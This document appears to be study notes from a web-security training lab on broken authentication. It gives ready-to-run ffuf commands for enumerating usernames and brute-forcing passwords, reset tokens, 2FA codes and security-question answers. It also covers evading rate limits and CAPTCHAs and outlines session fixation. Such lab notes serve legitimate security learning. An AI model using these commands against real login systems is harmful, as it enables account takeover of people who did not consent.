# Broken Authentication

## Categories of Authentication

- Knowledge: passwords, PINs, Answer to Security Question
- Ownership: ID cards, TOTP, Authenticator App, Security Token
- Inherence: Biometric authentication

## Brute-Force Attacks

- User Enumeration 
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
- Brute-Forcing Passwords
```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
```
- Brute-Forcing Password Reset Tokens (example based on weak 4 digit reset token sent via email)
```bash
seq -w 0 9999 > tokens.txt # -w pads numbers with prepending zeros
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
- Brute-Forcing 2FA Codes (example based on weak 4 digit TOTP token)
```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## Bypassing Brute-Force Protection

- **Rate Limit**: X-Forwarded-For HTTP Header can be randomised
- **CAPTCHAs**: Look for CAPTCHA solution in HTML code

## Password Attacks

- **Default Credentials**
  - [CIRT.net](https://cirt.net/passwords/)
  - SecLists Default Credentials (SecLists\Passwords\Default-Credentials\)
  - [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master)
- **Vulnerable Password Reset**
  - Guessable Security Questions (for example brute force [world cities](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv))
  ```bash
  cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt # all world cities
  cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt # just german cities
  ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
  ```
  - Username Injection in Password Reset Request (check post parameters in http request)

## Authentication Bypasses

- Accessing the protected page directly
- Manipulating HTTP Parameters to access protected pages

## Session Attacks

- Brute-Forcing cookies with insufficient entropy
- **Session Fixation**
  - Attacker obtains valid session identifier
  - Attacker coerces victim to use this session identifier (social engineering)
  - Victim authenticates to the vulnerable web application
  - Attacker knows the victim's session identifier and can hijack their account
- **Improper Session Timeout**
  - Sessions should expire after an appropriate time interval
  - Session validity duration depends on the web application